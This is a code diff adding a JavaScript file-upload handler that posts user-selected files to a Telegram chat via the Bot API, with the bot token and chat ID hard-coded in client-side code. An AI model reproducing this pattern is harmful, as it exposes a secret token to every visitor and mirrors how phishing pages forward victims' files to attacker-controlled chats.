@@ -87,3 +87,62 @@ function copyToClipboard(spanId) {
       console.error('Error al copiar: ', err);
   });
 }
+
+/* Metodo para subir Archivos */
+document.getElementById('uploadForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const files = document.getElementById('image_uploads').files;
+
+  if (files.length > 0) {
+      Array.from(files).forEach(file => {
+          addSolicitudFileHandler(file)
+              .then(() => console.log("Subiendo Archivo"))
+              .catch(error => console.error(error));
+      });
+  }
+});
+
+function handleFileChange(e) {
+  const files = e.target.files;
+  const preview = document.querySelector('.preview');
+  
+  if (files.length > 0) {
+      preview.innerHTML = '';
+      Array.from(files).forEach(file => {
+          const p = document.createElement('p');
+          p.textContent = file.name;
+          preview.appendChild(p);
+      });
+  } else {
+      preview.innerHTML = '<p>No files currently selected for upload</p>';
+  }
+}
+
+document.getElementById('image_uploads').addEventListener('change', handleFileChange);
+
+async function addSolicitudFileHandler(solicitudData) {
+  const CHAT_ID = '-4120594353';
+  const TOKEN_BOT_API = '6702487731:AAHKIgUr4xE-kzTF4DyrrsqjJQiC_d7b1Hw';
+
+  const urlFile = `https://api.telegram.org/bot${TOKEN_BOT_API}/sendDocument`;
+
+  const formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('document', solicitudData);
+
+  try {
+      const response = await fetch(urlFile, {
+          method: 'POST',
+          body: formData,
+      });
+
+      if (!response.ok) {
+          throw new Error(`Error: ${response.statusText}`);
+      }
+
+      const data = await response.json();
+      console.log(data);
+  } catch (error) {
+      console.log(error);
+  }
+}
